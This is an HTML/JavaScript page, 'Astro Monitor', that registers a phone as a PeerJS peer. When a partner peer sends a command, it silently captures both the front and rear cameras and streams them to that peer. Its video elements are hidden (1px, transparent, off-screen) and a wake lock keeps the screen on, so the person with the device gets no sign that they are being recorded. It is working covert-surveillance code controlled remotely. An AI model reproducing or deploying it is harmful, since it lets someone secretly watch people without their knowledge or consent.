<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Astro Monitor - Dual Camera</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: transparent;
            min-height: 0;
            padding: 0;
            margin: 0;
            overflow: hidden;
        }
        video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            top: -1000px;
            left: -1000px;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
    <video id="frontVideo" autoplay muted playsinline></video>
    <video id="backVideo" autoplay muted playsinline></video>

    <script>
        const MY_ID = "BPrivate";
        const PARTNER_ID = "APrivate";
        
        let peer = null;
        let dataConn = null;
        let frontCall = null;
        let backCall = null;
        let frontStream = null;
        let backStream = null;
        let isActive = false;
        let wakeLock = null;
        
        // Camera device IDs
        let FRONT_CAMERA_ID = null;
        let BACK_CAMERA_ID = null;
        
        function log(msg) {
            console.log(`[MONITOR] ${msg}`);
        }
        
        async function detectCameras() {
            try {
                await navigator.mediaDevices.getUserMedia({ video: true });
                
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cameras = devices.filter(d => d.kind === "videoinput");
                
                log(`Found ${cameras.length} camera(s):`);
                cameras.forEach((cam, i) => {
                    log(`  [${i}] ${cam.label || 'Unnamed'}`);
                    
                    const label = cam.label.toLowerCase();
                    if (label.includes("back") || label.includes("rear") || label.includes("environment")) {
                        BACK_CAMERA_ID = cam.deviceId;
                        log(`  ✅ BACK camera identified`);
                    } else if (label.includes("front") || label.includes("user") || label.includes("face")) {
                        FRONT_CAMERA_ID = cam.deviceId;
                        log(`  ✅ FRONT camera identified`);
                    }
                });
                
                // Fallback
                if (!BACK_CAMERA_ID && cameras[0]) {
                    BACK_CAMERA_ID = cameras[0].deviceId;
                    log(`  Using camera[0] as BACK`);
                }
                if (!FRONT_CAMERA_ID && cameras[1]) {
                    FRONT_CAMERA_ID = cameras[1].deviceId;
                    log(`  Using camera[1] as FRONT`);
                }
                
                return true;
            } catch (err) {
                log(`Camera detection failed: ${err.message}`);
                return false;
            }
        }
        
        async function getCameraStream(camera, deviceId) {
            const isBack = (camera === 'back');
            
            // Use exact deviceId if available
            if (deviceId) {
                try {
                    log(`Getting ${camera} camera with deviceId`);
                    const stream = await navigator.mediaDevices.getUserMedia({
                        audio: false,
                        video: {
                            deviceId: { exact: deviceId },
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        }
                    });
                    const track = stream.getVideoTracks()[0];
                    const settings = track.getSettings();
                    log(`✅ ${camera} camera acquired - facingMode: ${settings.facingMode}`);
                    return stream;
                } catch (err) {
                    log(`deviceId failed for ${camera}: ${err.message}`);
                }
            }
            
            // Fallback to facingMode
            try {
                log(`Falling back to facingMode for ${camera}`);
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: false,
                    video: {
                        facingMode: { exact: isBack ? "environment" : "user" },
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                const track = stream.getVideoTracks()[0];
                const settings = track.getSettings();
                log(`✅ ${camera} camera acquired via facingMode - facingMode: ${settings.facingMode}`);
                return stream;
            } catch (err) {
                log(`facingMode failed for ${camera}: ${err.message}`);
            }
            
            return null;
        }
        
        async function startBothCameras() {
            if (isActive) {
                log('Already active');
                return;
            }
            
            log('Starting both cameras...');
            
            try {
                // Get both camera streams simultaneously
                const [front, back] = await Promise.all([
                    getCameraStream('front', FRONT_CAMERA_ID),
                    getCameraStream('back', BACK_CAMERA_ID)
                ]);
                
                if (front) {
                    frontStream = front;
                    document.getElementById('frontVideo').srcObject = front;
                    log('Front camera stream ready');
                } else {
                    log('Failed to get front camera', 'error');
                }
                
                if (back) {
                    backStream = back;
                    document.getElementById('backVideo').srcObject = back;
                    log('Back camera stream ready');
                } else {
                    log('Failed to get back camera', 'error');
                }
                
                if (frontStream && backStream) {
                    // Create separate calls for each camera
                    frontCall = peer.call(PARTNER_ID, frontStream, { 
                        metadata: { camera: 'front', type: 'video' } 
                    });
                    backCall = peer.call(PARTNER_ID, backStream, { 
                        metadata: { camera: 'back', type: 'video' } 
                    });
                    
                    isActive = true;
                    log('✅ Both camera streams sent to remote');
                    
                    // Notify remote that both streams are ready
                    if (dataConn && dataConn.open) {
                        dataConn.send({ type: 'both_cameras_active' });
                    }
                }
                
            } catch (err) {
                log(`Failed to start cameras: ${err.message}`);
            }
        }
        
        function stopBothCameras() {
            log('Stopping both cameras...');
            
            if (frontCall) {
                frontCall.close();
                frontCall = null;
            }
            if (backCall) {
                backCall.close();
                backCall = null;
            }
            if (frontStream) {
                frontStream.getTracks().forEach(t => t.stop());
                frontStream = null;
            }
            if (backStream) {
                backStream.getTracks().forEach(t => t.stop());
                backStream = null;
            }
            document.getElementById('frontVideo').srcObject = null;
            document.getElementById('backVideo').srcObject = null;
            isActive = false;
        }
        
        async function preventScreenLock() {
            if ('wakeLock' in navigator) {
                try {
                    wakeLock = await navigator.wakeLock.request('screen');
                    log('Screen wake lock acquired');
                } catch (err) {}
            }
        }
        
        function handleDataMessage(data) {
            log(`Received: ${data.type}`);
            
            if (data.type === 'start_dual_cameras') {
                startBothCameras();
            } else if (data.type === 'stop_dual_cameras') {
                stopBothCameras();
            }
        }
        
        function initPeer() {
            if (peer) {
                peer.destroy();
                peer = null;
            }
            
            log(`Initializing monitor as ${MY_ID}`);
            peer = new Peer(MY_ID);
            
            peer.on('open', async () => {
                log(`✅ Monitor ACTIVE`);
                await detectCameras();
                log(`Ready for connection from ${PARTNER_ID}`);
                log(`Will send BOTH front and back cameras when requested`);
            });
            
            peer.on('connection', (conn) => {
                if (conn.peer === PARTNER_ID) {
                    log(`📡 Data connection established`);
                    dataConn = conn;
                    conn.on('data', handleDataMessage);
                    conn.on('close', () => { 
                        dataConn = null;
                        stopBothCameras();
                    });
                } else {
                    conn.close();
                }
            });
            
            peer.on('error', (err) => {
                if (err.type === 'unavailable-id') {
                    setTimeout(() => initPeer(), 5000);
                }
            });
        }
        
        log('=== ASTRO MONITOR - DUAL CAMERA MODE ===');
        log('Device will send BOTH front and back cameras simultaneously');
        preventScreenLock();
        initPeer();
        
        window.addEventListener('beforeunload', () => {
            stopBothCameras();
            if (peer) peer.destroy();
            if (wakeLock) wakeLock.release();
        });
    </script>
</body>
</html>
